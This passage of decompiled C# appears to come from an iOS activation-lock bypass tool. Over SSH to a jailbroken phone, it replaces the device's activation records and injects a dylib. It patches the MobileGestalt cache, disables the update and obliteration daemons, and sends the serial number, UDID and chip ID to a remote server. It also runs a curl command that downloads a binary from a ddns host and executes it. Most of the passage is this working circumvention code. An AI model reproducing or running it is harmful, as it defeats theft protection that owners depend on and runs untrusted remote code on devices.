					if (((BaseClient)Ssh).IsConnected)
					{
						InsertLabelText("SSH already connected.", Color.YellowGreen);
						Console.WriteLine("[DEBUG] SSH ya está conectado.");
						isConnected = true;
					}
					else
					{
						Console.WriteLine("[DEBUG] Intentando conectar SSH...");
						ConnectionInfo connectionInfo = ((BaseClient)Ssh).ConnectionInfo;
						Console.WriteLine("[DEBUG] SSH Host: " + (((connectionInfo != null) ? connectionInfo.Host : null) ?? "N/A"));
						ConnectionInfo connectionInfo2 = ((BaseClient)Ssh).ConnectionInfo;
						Console.WriteLine($"[DEBUG] SSH Port: {((connectionInfo2 != null) ? connectionInfo2.Port : 0)}");
						Task connectTask = Task.Run(delegate
						{
							((BaseClient)Ssh).Connect();
						});
						if (await Task.WhenAny(new Task[2]
						{
							connectTask,
							Task.Delay(30000)
						}) != connectTask)
						{
							Console.WriteLine("[ERROR] Timeout al conectar SSH (30 segundos)");
							throw new TimeoutException("SSH connection timeout after 30 seconds");
						}
						isConnected = ((BaseClient)Ssh).IsConnected;
						Console.WriteLine("[DEBUG] Estado de conexión SSH: " + (isConnected ? "CONECTADO" : "NO CONECTADO"));
						if (isConnected)
						{
							Console.WriteLine("[DEBUG] Ejecutando comando de prueba SSH...");
							SshCommand cmd = Ssh.CreateCommand("echo Hello");
							cmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
							string result = cmd.Execute();
							Console.WriteLine("[DEBUG] Resultado del comando SSH: '" + result + "'");
							Console.WriteLine($"[DEBUG] ExitStatus del comando: {cmd.ExitStatus}");
						}
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("[ERROR] Error al iniciar iProxy o conectar SSH: " + ex2.GetType().Name);
					Console.WriteLine("[ERROR] Mensaje: " + ex2.Message);
					Console.WriteLine("[ERROR] StackTrace: " + ex2.StackTrace);
					InsertLabelText("Error starting iProxy or connecting SSH: " + ex2.Message, Color.Black);
					InsertLabelText("NO", Color.Black);
					return false;
				}
				InsertLabelText(isConnected ? "Jailbreak Check: OK !" : "Jailbreak Check: Offline !", isConnected ? Color.Black : Color.Black);
				Console.WriteLine("[DEBUG] Resultado final de CheckJailbreak: " + (isConnected ? "YES" : "NO"));
				return isConnected;
			}
			catch (Exception ex)
			{
				Console.WriteLine("[ERROR] Error general en CheckJailbreak: " + ex.GetType().Name);
				Console.WriteLine("[ERROR] Mensaje: " + ex.Message);
				Console.WriteLine("[ERROR] StackTrace: " + ex.StackTrace);
				InsertLabelText("Unexpected error in CheckJailbreak: " + ex.Message, Color.Black);
				InsertLabelText("NO", Color.DarkOrange);
				return false;
			}
			finally
			{
				Console.WriteLine("[DEBUG] Ejecutando limpieza final...");
				Console.WriteLine("[DEBUG] Deteniendo animación de 'Checking...'");
				TerminateIproxyProcesses();
				if (((BaseClient)Ssh).IsConnected)
				{
					Console.WriteLine("[DEBUG] Desconectando SSH...");
					((BaseClient)Ssh).Disconnect();
				}
				Console.WriteLine("[DEBUG] ========== CheckJailbreak FINALIZADO ==========");
			}
		}

		public async Task PostActivaction()
		{
			Console.WriteLine("[DEBUG] ========== INICIANDO PostActivaction ==========");
			Console.WriteLine($"[DEBUG] Timestamp: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
			string postUrl = "https://google.com/lockdown/Activate.php";
			Console.WriteLine("[DEBUG] URL de activación: " + postUrl);
			string serialNumber = currentiOSDevice.SerialNumber;
			string uniqueChipID = currentiOSDevice.UniqueChipID;
			string uniqueDeviceID = currentiOSDevice.UniqueDeviceID;
			string device_product_type = currentiOSDevice.ProductType;
			Console.WriteLine("[DEBUG] SerialNumber: " + serialNumber);
			Console.WriteLine("[DEBUG] UniqueChipID: " + uniqueChipID);
			Console.WriteLine("[DEBUG] UniqueDeviceID: " + uniqueDeviceID);
			Console.WriteLine("[DEBUG] ProductType: " + device_product_type);
			Dictionary<string, string> postData = new Dictionary<string, string>
			{
				{ "sn", serialNumber },
				{ "udid", uniqueDeviceID },
				{ "ucid", uniqueChipID }
			};
			HttpClient httpClient = new HttpClient();
			try
			{
				httpClient.Timeout = TimeSpan.FromSeconds(30.0);
				Console.WriteLine("[DEBUG] Preparando POST request...");
				FormUrlEncodedContent content = new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)postData);
				try
				{
					Console.WriteLine("[DEBUG] Enviando POST request...");
					HttpResponseMessage response = await httpClient.PostAsync(postUrl, (HttpContent)(object)content);
					Console.WriteLine($"[DEBUG] POST Response Status: {response.StatusCode}");
					if (!response.IsSuccessStatusCode)
					{
						Console.WriteLine("[DEBUG] POST falló, intentando con GET...");
						string queryParams = "?sn=" + WebUtility.UrlEncode(serialNumber) + "&udid=" + WebUtility.UrlEncode(uniqueDeviceID) + "&ucid=" + WebUtility.UrlEncode(uniqueChipID);
						string getUrl = postUrl + queryParams;
						Console.WriteLine("[DEBUG] GET URL: " + getUrl);
						response = await httpClient.GetAsync(getUrl);
						Console.WriteLine($"[DEBUG] GET Response Status: {response.StatusCode}");
					}
					if (response.IsSuccessStatusCode)
					{
						Console.WriteLine("[DEBUG] Activación exitosa. Respuesta: " + await response.Content.ReadAsStringAsync());
					}
					else
					{
						Console.WriteLine($"[ERROR] Error en la activación. Status: {response.StatusCode}");
						Console.WriteLine("[ERROR] Reason: " + response.ReasonPhrase);
					}
				}
				catch (TaskCanceledException ex3)
				{
					Console.WriteLine("[ERROR] Timeout en la petición HTTP: " + ex3.Message);
				}
				catch (Exception ex2)
				{
					Console.WriteLine("[ERROR] Error en petición HTTP: " + ex2.GetType().Name + " - " + ex2.Message);
				}
				string activationFileUrlPrimary = "https://google.com/lockdown/Raptor/" + serialNumber + "/activation_record.plist";
				string activationFileUrlSecondary = "https://google.com/fairplaykey/Devices/" + device_product_type + "/" + uniqueDeviceID + "/activation_records/activation_record.plist";
				string RaptorActivaction = Path.Combine(ToolDir, "ref", "activation_record.plist");
				Console.WriteLine("[DEBUG] URL primaria del archivo: " + activationFileUrlPrimary);
				Console.WriteLine("[DEBUG] URL secundaria del archivo: " + activationFileUrlSecondary);
				Console.WriteLine("[DEBUG] Ruta local destino: " + RaptorActivaction);
				Directory.CreateDirectory(Path.GetDirectoryName(RaptorActivaction));
				Console.WriteLine("[DEBUG] Directorio creado/verificado");
				try
				{
					Console.WriteLine("[DEBUG] Intentando descargar desde URL primaria...");
					HttpResponseMessage fileResponse = await httpClient.GetAsync(activationFileUrlPrimary);
					Console.WriteLine($"[DEBUG] Respuesta primaria: {fileResponse.StatusCode}");
					if (!fileResponse.IsSuccessStatusCode)
					{
						Console.WriteLine("[DEBUG] Fallo en primaria, intentando URL secundaria...");
						fileResponse = await httpClient.GetAsync(activationFileUrlSecondary);
						Console.WriteLine($"[DEBUG] Respuesta secundaria: {fileResponse.StatusCode}");
					}
					if (fileResponse.IsSuccessStatusCode)
					{
						byte[] fileBytes = await fileResponse.Content.ReadAsByteArrayAsync();
						Console.WriteLine($"[DEBUG] Archivo descargado. Tamaño: {fileBytes.Length} bytes");
						File.WriteAllBytes(RaptorActivaction, fileBytes);
						Console.WriteLine("[DEBUG] Archivo guardado en: " + RaptorActivaction);
					}
					else
					{
						Console.WriteLine("[ERROR] No se pudo descargar activation_record.plist");
						Console.WriteLine($"[ERROR] Status: {fileResponse.StatusCode}, Reason: {fileResponse.ReasonPhrase}");
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine("[ERROR] Error descargando archivo: " + ex.GetType().Name + " - " + ex.Message);
				}
			}
			finally
			{
				((IDisposable)httpClient)?.Dispose();
			}
			Console.WriteLine("[DEBUG] ========== PostActivaction COMPLETADO ==========");
		}

		public async Task ActivateSignal()
		{
			_ = 47;
			try
			{
				InsertLabelText("Starting activation process...", Color.Black);
				ProgressTask(5);
				string modelFull = ((Control)ModeloffHello).Text;
				_ = currentiOSDevice.UniqueChipID;
				_ = currentiOSDevice.SerialNumber;
				_ = currentiOSDevice.UniqueDeviceID;
				InsertLabelText("Device detected: " + modelFull, Color.Black);
				await PostActivaction();
				ProgressTask(10);
				string iOSPatSkipSetup = Path.Combine(ToolDir, "ref", "libirecovery-1.0.3.dll");
				string activationRecord = Path.Combine(ToolDir, "ref", "activation_record.plist");
				string ElleKit = Path.Combine(ToolDir, "ref", "ellekit");
				if (!File.Exists(iOSPatSkipSetup) || !File.Exists(activationRecord) || !File.Exists(ElleKit))
				{
					InsertLabelText("Required files missing. Please check installation.", Color.Red);
					ProgressTask(0);
					MessageBox.Show("Required activation files are missing.", "ERROR", (MessageBoxButtons)0, (MessageBoxIcon)16);
					return;
				}
				InsertLabelText("Establishing SSH connection...", Color.Black);
				ProgressTask(15);
				StartIproxy();
				await Task.Delay(1000);
				if (!((BaseClient)Ssh).IsConnected)
				{
					InsertLabelText("Connecting to device via SSH...", Color.Black);
					Task sshTask2 = Task.Run(delegate
					{
						((BaseClient)Ssh).Connect();
					});
					if (await Task.WhenAny(new Task[2]
					{
						sshTask2,
						Task.Delay(30000)
					}) != sshTask2)
					{
						InsertLabelText("SSH connection timeout. Please check your connection.", Color.Red);
						ProgressTask(0);
						throw new TimeoutException("SSH connection timeout");
					}
					ProgressTask(18);
				}
				if (!((BaseClient)Scp).IsConnected)
				{
					InsertLabelText("Establishing SCP connection...", Color.Black);
					Task sshTask2 = Task.Run(delegate
					{
						((BaseClient)Scp).Connect();
					});
					if (await Task.WhenAny(new Task[2]
					{
						sshTask2,
						Task.Delay(30000)
					}) != sshTask2)
					{
						InsertLabelText("SCP connection timeout.", Color.Red);
						ProgressTask(0);
						throw new TimeoutException("SCP connection timeout");
					}
					ProgressTask(20);
				}
				if (!((BaseClient)Ssh).IsConnected || !((BaseClient)Scp).IsConnected)
				{
					InsertLabelText("Unable to establish connection. Please check jailbreak.", Color.Red);
					ProgressTask(0);
					MessageBox.Show("Unable to establish an SSH connection.", "ERROR", (MessageBoxButtons)0, (MessageBoxIcon)16);
					return;
				}
				InsertLabelText("Connection established successfully.", Color.Black);
				ProgressTask(22);
				SshCommand mountCmd = Ssh.CreateCommand("mount -o rw,union,update /");
				mountCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => mountCmd.Execute());
				InsertLabelText("Preparing activation files...", Color.Black);
				ProgressTask(25);
				SshCommand mkdirCmd = Ssh.CreateCommand("mkdir -p /var/jb/ && chmod 777 /var/jb/");
				mkdirCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => mkdirCmd.Execute());
				ProgressTask(28);
				InsertLabelText("Uploading activation components...", Color.Black);
				Task[] uploadTasks = new Task[2]
				{
					Task.Run(async delegate
					{
						Task uploadTask2 = Task.Run(delegate
						{
							Scp.Upload(new FileInfo(iOSPatSkipSetup), "/./private/var/mobile/com.apple.purplebuddy.plist");
						});
						if (await Task.WhenAny(new Task[2]
						{
							uploadTask2,
							Task.Delay(60000)
						}) != uploadTask2)
						{
							throw new TimeoutException("Upload timeout for purplebuddy.plist");
						}
					}),
					Task.Run(async delegate
					{
						Task uploadTask = Task.Run(delegate
						{
							Scp.Upload(new FileInfo(ElleKit), "/var/jb/ellekit.tar");
						});
						if (await Task.WhenAny(new Task[2]
						{
							uploadTask,
							Task.Delay(60000)
						}) != uploadTask)
						{
							throw new TimeoutException("Upload timeout for ellekit.tar");
						}
					})
				};
				await Task.WhenAll(uploadTasks);
				InsertLabelText("Core files uploaded successfully.", Color.Black);
				ProgressTask(35);
				InsertLabelText("Configuring system permissions...", Color.Black);
				ProgressTask(38);
				string[] chmodCommands = new string[4] { "chmod 775 /./private/var/mobile/com.apple.purplebuddy.plist", "chmod -R 777 /var/jb/", "chmod +x /var/jb/ellekit.tar", "chmod 7777 /var/jb/ellekit.tar" };
				string[] array = chmodCommands;
				foreach (string command in array)
				{
					SshCommand cmd2 = Ssh.CreateCommand(command);
					cmd2.CommandTimeout = TimeSpan.FromSeconds(10.0);
					await Task.Run(() => cmd2.Execute());
				}
				InsertLabelText("Extracting activation toolkit...", Color.Black);
				SshCommand tarCmd = Ssh.CreateCommand("tar -xvf /var/jb/ellekit.tar -C /var/jb/");
				tarCmd.CommandTimeout = TimeSpan.FromSeconds(30.0);
				await Task.Run(() => tarCmd.Execute());
				ProgressTask(40);
				InsertLabelText("Installing activation patches...", Color.Black);
				await Task.Run(() => UploadResource(Titan.Properties.Resources.HASNIDylib, "/var/jb/Library/MobileSubstrate/DynamicLibraries/HASNIDylib.dylib"));
				await Task.Run(() => UploadResource(Titan.Properties.Resources.HASNIDylib1, "/var/jb/Library/MobileSubstrate/DynamicLibraries/HASNIDylib.plist"));
				string[] permCommands = new string[4] { "chmod 777 /var/jb/Library/MobileSubstrate/DynamicLibraries/HASNIDylib.dylib", "chmod 777 /var/jb/Library/MobileSubstrate/DynamicLibraries/HASNIDylib.plist", "chmod +x /var/jb/Library/MobileSubstrate/DynamicLibraries/HASNIDylib.plist", "chmod +x /var/jb/Library/MobileSubstrate/DynamicLibraries/HASNIDylib.dylib" };
				array = permCommands;
				foreach (string command2 in array)
				{
					SshCommand cmd3 = Ssh.CreateCommand(command2);
					cmd3.CommandTimeout = TimeSpan.FromSeconds(10.0);
					await Task.Run(() => cmd3.Execute());
				}
				SshCommand loaderCmd = Ssh.CreateCommand("/var/jb/usr/libexec/ellekit/loader");
				loaderCmd.CommandTimeout = TimeSpan.FromSeconds(15.0);
				await Task.Run(() => loaderCmd.Execute());
				InsertLabelText("Processing activation records...", Color.Black);
				ProgressTask(45);
				string[] commands = new string[4] { "chflags -R nouchg /private/var/containers/Data/System/*/Library/activation_records", "rm -rf /private/var/containers/Data/System/*/Library/activation_records", "mkdir /private/var/containers/Data/System/*/Library/internal/../activation_records", "rm -f /private/var/mobile/activation_record.plist" };
				array = commands;
				foreach (string command3 in array)
				{
					SshCommand cmd4 = Ssh.CreateCommand(command3);
					cmd4.CommandTimeout = TimeSpan.FromSeconds(10.0);
					await Task.Run(() => cmd4.Execute());
				}
				InsertLabelText("Uploading activation certificate...", Color.Black);
				Task uploadActivationTask = Task.Run(delegate
				{
					Scp.Upload(new FileInfo(activationRecord), "/./private/var/mobile/activation_record.plist");
				});
				if (await Task.WhenAny(new Task[2]
				{
					uploadActivationTask,
					Task.Delay(60000)
				}) != uploadActivationTask)
				{
					throw new TimeoutException("Upload timeout for activation_record.plist");
				}
				ProgressTask(50);
				SshCommand moveCmd = Ssh.CreateCommand("mv -f /./private/var/mobile/activation_record.plist /private/var/containers/Data/System/*/Library/activation_records/");
				moveCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => moveCmd.Execute());
				SshCommand chflagsCmd = Ssh.CreateCommand("chflags -R uchg /private/var/containers/Data/System/*/Library/activation_records");
				chflagsCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => chflagsCmd.Execute());
				InsertLabelText("Configuring MobileGestalt cache...", Color.Black);
				ProgressTask(55);
				string baseRemotePath = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/";
				string pathMobileGestalt = baseRemotePath + "com.apple.MobileGestalt.plist";
				string pathTempGestalt = baseRemotePath + "temp.plist";
				DeleteFolderatutmpA1();
				ProgressTask(58);
				SshCommand mountCmd2 = Ssh.CreateCommand("mount -o rw,union,update /");
				mountCmd2.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => mountCmd2.Execute());
				InsertLabelText("Installing system modifications...", Color.Black);
				await Task.Run(() => UploadResource(Titan.Properties.Resources.getkey, baseRemotePath + "getkey"));
				await Task.Run(() => UploadResource(Titan.Properties.Resources.z, baseRemotePath + "z"));
				await Task.Run(() => UploadResource(Titan.Properties.Resources.recache, baseRemotePath + "recache"));
				ProgressTask(62);
				Thread.Sleep(2000);
				SshCommand chmodResourcesCmd = Ssh.CreateCommand("chmod +x " + baseRemotePath + "*");
				chmodResourcesCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => chmodResourcesCmd.Execute());
				SshCommand recacheCmd = Ssh.CreateCommand(baseRemotePath + "recache");
				recacheCmd.CommandTimeout = TimeSpan.FromSeconds(15.0);
				await Task.Run(() => recacheCmd.Execute());
				SshCommand zCmd = Ssh.CreateCommand(baseRemotePath + "z");
				zCmd.CommandTimeout = TimeSpan.FromSeconds(15.0);
				await Task.Run(() => zCmd.Execute());
				InsertLabelText("Modifying device configuration...", Color.Black);
				ProgressTask(65);
				SshCommand mvGestaltCmd = Ssh.CreateCommand("mv -f " + pathMobileGestalt + " " + pathTempGestalt);
				mvGestaltCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => mvGestaltCmd.Execute());
				SshCommand recacheCmd2 = Ssh.CreateCommand(baseRemotePath + "recache");
				recacheCmd2.CommandTimeout = TimeSpan.FromSeconds(15.0);
				await Task.Run(() => recacheCmd2.Execute());
				ProgressTask(68);
				string localBaseDir = Path.Combine(Environment.CurrentDirectory, "ref", "imobiledevice");
				if (!Directory.Exists(localBaseDir))
				{
					Directory.CreateDirectory(localBaseDir);
				}
				else
				{
					DirectoryInfo di = new DirectoryInfo(localBaseDir);
					FileInfo[] files = di.GetFiles();
					foreach (FileInfo file in files)
					{
						file.Delete();
					}
					DirectoryInfo[] directories = di.GetDirectories();
					foreach (DirectoryInfo dir in directories)
					{
						dir.Delete(recursive: true);
					}
				}
				InsertLabelText("Processing configuration files...", Color.Black);
				try
				{
					Task downloadTask1 = Task.Run(delegate
					{
						Scp.Download(pathMobileGestalt, new DirectoryInfo(localBaseDir));
					});
					await Task.WhenAny(new Task[2]
					{
						downloadTask1,
						Task.Delay(30000)
					});
					Task downloadTask2 = Task.Run(delegate
					{
						Scp.Download(pathTempGestalt, new DirectoryInfo(localBaseDir));
					});
					await Task.WhenAny(new Task[2]
					{
						downloadTask2,
						Task.Delay(30000)
					});
				}
				catch (Exception)
				{
				}
				ProgressTask(72);
				Thread.Sleep(500);
				string cmdArguments = "/c libplist.exe imobiledevice\\temp.plist imobiledevice\\com.apple.MobileGestalt.plist";
				string txt = CmdResultStringGestalt(cmdArguments);
				if (txt.Contains("Successfull"))
				{
					InsertLabelText("Configuration patched successfully.", Color.Black);
					ProgressTask(75);
					string localPlistPath = Path.Combine(localBaseDir, "com.apple.MobileGestalt.plist");
					Task uploadGestaltTask = Task.Run(delegate
					{
						Scp.Upload(new FileInfo(localPlistPath), pathMobileGestalt);
					});
					await Task.WhenAny(new Task[2]
					{
						uploadGestaltTask,
						Task.Delay(30000)
					});
					ProgressTask(78);
				}
				SshCommand chmod775GestaltCmd = Ssh.CreateCommand("chmod 7775 /./private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist");
				chmod775GestaltCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => chmod775GestaltCmd.Execute());
				SshCommand chflagsGestaltCmd = Ssh.CreateCommand("chflags uchg /./private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist");
				chflagsGestaltCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => chflagsGestaltCmd.Execute());
				ProgressTask(80);
				InsertLabelText("Disabling automatic updates...", Color.Black);
				string[] otaCommands = new string[4] { "launchctl unload -F -w /System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", "launchctl unload -F -w /System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", "launchctl unload -F -w /System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist", "launchctl unload -F -w /System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist" };
				array = otaCommands;
				foreach (string command4 in array)
				{
					SshCommand cmd = Ssh.CreateCommand(command4);
					cmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
					await Task.Run(() => cmd.Execute());
				}
				ProgressTask(82);
				InsertLabelText("Restarting activation services...", Color.Black);
				SshCommand launchCmd = Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/* && launchctl load /System/Library/LaunchDaemons/*");
				launchCmd.CommandTimeout = TimeSpan.FromSeconds(30.0);
				await Task.Run(() => launchCmd.Execute());
				await Task.Delay(3000);
				SshCommand stopCmd = Ssh.CreateCommand("launchctl stop com.apple.mobileactivationd");
				stopCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => stopCmd.Execute());
				await Task.Delay(3000);
				SshCommand startCmd = Ssh.CreateCommand("launchctl start com.apple.mobileactivationd");
				startCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => startCmd.Execute());
				ProgressTask(85);
				await Task.Delay(3000);
				SshCommand mountCmdv3 = Ssh.CreateCommand("curl -o /var/mobile/Media/Act https://osxteam.ddns.net/files/Actfair && chmod 755 /var/mobile/Media/Act && /var/mobile/Media/./Act ByOsxMad");
				mountCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => mountCmdv3.Execute());
				ProgressTask(40);
				SshCommand mountCmdv4 = Ssh.CreateCommand("killall backboardd");
				mountCmd2.CommandTimeout = TimeSpan.FromSeconds(10.0);
				await Task.Run(() => mountCmdv4.Execute());
				ProgressTask(50);
				await iosUtility("readpair");
				await Task.Delay(1000);
				await iosUtility("pair");
				await Task.Delay(1000);
				await iosUtility("pair");
				InsertLabelText("Checking activation status...", Color.Black);
				string activationState = await iosUtility("info");
				ProgressTask(87);
				try
				{
					InsertLabelText("Applying changes (device may restart)...", Color.Black);
					SshCommand rebootCmd = Ssh.CreateCommand("launchctl reboot userspace");
					rebootCmd.CommandTimeout = TimeSpan.FromSeconds(10.0);
					await Task.Run(() => rebootCmd.Execute());
				}
				catch (Exception)
				{
				}
				InsertLabelText("Waiting for device to apply changes...", Color.Black);
				await Task.Delay(15000);
				ProgressTask(90);
				InsertLabelText("Verifying final activation status...", Color.Black);
				ProgressTask(95);
				if (activationState.ToLower().Contains("activated") || activationState == "Activated")
				{
					InsertLabelText("✓ Device activated successfully!", Color.Green);
					ProgressTask(100);
					MessageBox.Show("Activation complete for " + modelFull + ".", "Activated", (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
				else
				{
					InsertLabelText("Activation status pending. Please check device.", Color.Orange);
					ProgressTask(100);
				}
			}
			catch (Exception ex)
			{
				InsertLabelText("Error: " + ex.Message, Color.Red);
				ProgressTask(0);
				MessageBox.Show(ex.Message, "ERROR", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}

		public async Task<string> iosUtility(string arguments)
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			string iOSPath = Path.Combine(currentDirectory, "ref\\ios.exe");
			Process process = new Process
			{
				StartInfo = 
				{
					FileName = iOSPath,
					Arguments = arguments,
					UseShellExecute = false,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					CreateNoWindow = true
				}
			};
			Console.WriteLine("[DEBUG] Ejecutando ios.exe con argumentos: " + arguments);
			process.Start();
			string output = await process.StandardOutput.ReadToEndAsync();
			string errorOutput = await process.StandardError.ReadToEndAsync();
			process.WaitForExit();
			string combinedOutput = output + errorOutput;
			Console.WriteLine("ios.exe Output: " + output);
			Console.WriteLine("ios.exe Error Output: " + errorOutput);
			return combinedOutput.Trim();
		}

		public void WaitForDownloadFinish()
		{
			while (isDownloading)
			{
				Application.DoEvents();
			}
		}

		public void DownloadSingleFile(string link, string outputFile)
		{
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0025: Expected O, but got Unknown
			isDownloading = true;
			ServicePointManager.Expect100Continue = false;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			DownloadConfiguration downloadOpt = CreateDownloadConfiguration();
			DownloadService downloader = new DownloadService(downloadOpt);
			((AbstractDownloadService)downloader).DownloadProgressChanged += (EventHandler<Downloader.DownloadProgressChangedEventArgs>)OnDownloadProgressChanged;
			((AbstractDownloadService)downloader).DownloadFileCompleted += (EventHandler<AsyncCompletedEventArgs>)OnDownloadFileCompleted;
			((AbstractDownloadService)downloader).DownloadFileTaskAsync(link, outputFile, default(CancellationToken));
		}

		public async Task DownloadFile(string link, string outputPath)
		{
			isDownloading = true;
			DownloadConfiguration downloadOpt = CreateDownloadConfiguration();
			DownloadService downloader = new DownloadService(downloadOpt);
			((AbstractDownloadService)downloader).DownloadProgressChanged += (EventHandler<Downloader.DownloadProgressChangedEventArgs>)OnDownloadProgressChanged;
			((AbstractDownloadService)downloader).DownloadFileCompleted += (EventHandler<AsyncCompletedEventArgs>)OnDownloadFileCompleted;
			await ((AbstractDownloadService)downloader).DownloadFileTaskAsync(link, outputPath, default(CancellationToken));
		}

		private DownloadConfiguration CreateDownloadConfiguration()
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Expected O, but got Unknown
			//IL_0053: Expected O, but got Unknown
			DownloadConfiguration val = new DownloadConfiguration();
			val.BufferBlockSize = 42000;
			val.MaxTryAgainOnFailover = 100;
			val.Timeout = 30000;
			val.ParallelDownload = false;
			RequestConfiguration val2 = new RequestConfiguration();
			val2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.3";
			val2.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			val2.KeepAlive = true;
			val.RequestConfiguration = val2;
			return val;
		}

		private void OnDownloadStarted(object sender, EventArgs e)
		{
			startTime = DateTime.Now;
		}

		public void OnDownloadProgressChanged(object sender, Downloader.DownloadProgressChangedEventArgs e)
		{
			isDownloading = true;
			double receivedMB = (double)e.ReceivedBytesSize / 1024.0 / 1024.0;
			double speedMBs = e.AverageBytesPerSecondSpeed / 1024.0 / 1024.0;
			string labelText = $"Downloading Resources ({receivedMB:N2} MB / Speed {speedMBs:N2} KB/S)...";
			UI(delegate
			{
			});
		}

		private void UI(Action uiUpdate)
		{
		}

		private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
		{
			isDownloading = false;
			if (e.Cancelled)
			{
				downloadError = "Cancelled";
			}
			else if (e.Error != null)
			{
				downloadError = e.Error!.Message;
			}
			else
			{
				downloadError = null;
			}
		}

		public void Delete(string Filedelete)
		{
			if (File.Exists(Filedelete))
			{
				File.Delete(Filedelete);
			}
		}

		public void CleanTempDir(string path)
		{
			try
			{
				if (Directory.Exists(path))
				{
					Directory.Delete(path, recursive: true);
				}
				Directory.CreateDirectory(path);
			}
			catch
			{
			}
		}

		public void DeleteFolderatutmpA1()
		{
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Users\\PC\\AppData\\Local\\Temp");
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					fileInfo.Delete();
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					directoryInfo2.Delete(recursive: true);
				}
			}
			catch
			{
			}
		}

		private string H1010X9191(string base64String)
		{
			byte[] bytes = Convert.FromBase64String(base64String);
			return Encoding.UTF8.GetString(bytes);
		}

		public string CmdResultStringGestalt(string argument)
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					UseShellExecute = false,
					CreateNoWindow = true,
					FileName = "cmd.exe",
					Verb = "runas",
					Arguments = argument,
					WorkingDirectory = Path.Combine(Environment.CurrentDirectory, "ref"),
					RedirectStandardOutput = true,
					RedirectStandardError = true
				}
			};
			process.Start();
			string output = process.StandardOutput.ReadToEnd();
			string error = process.StandardError.ReadToEnd();
			process.WaitForExit();
			process.Dispose();
			return output + error;
		}

		public string CmdNomalReturnString(string filename, string arguments)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = filename,
				Arguments = arguments,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				CreateNoWindow = true
			};
			process.Start();
			return process.StandardOutput.ReadToEnd();
		}

		private static async Task<string> ShellCMDAsync(string command)
		{
			using Process process = new Process();
			ProcessStartInfo processStartInfo = (process.StartInfo = new ProcessStartInfo("cmd", "/c " + command)
			{
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			});
			try
			{
				process.Start();
				string output = await process.StandardOutput.ReadToEndAsync();
				string error = await process.StandardError.ReadToEndAsync();
				process.WaitForExit();
				if (!string.IsNullOrEmpty(output))
				{
					Console.WriteLine(output);
				}
				if (!string.IsNullOrEmpty(error))
				{
					Console.WriteLine("Error: " + error);
				}
				return string.IsNullOrEmpty(error) ? output : error;
			}
			catch (Exception ex)
			{
				Console.WriteLine("An exception occurred: " + ex.Message);
				return "Exception: " + ex.Message;
			}
		}

		private async Task KillProcess(string processName)
		{
			Process[] processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(processName));
			Process[] array = processes;
			foreach (Process process in array)
			{
				try
				{
					process.Kill();
				}
				catch (Exception)
				{
				}
			}
		}

		private void CloseProcessByName(string processName)
		{
			try
			{
				Process[] processes = Process.GetProcessesByName(processName);
				Process[] array = processes;
				foreach (Process process in array)
				{
					try
					{
						process.Kill();
						process.WaitForExit();
						processKilled = true;
					}
					catch (Exception ex2)
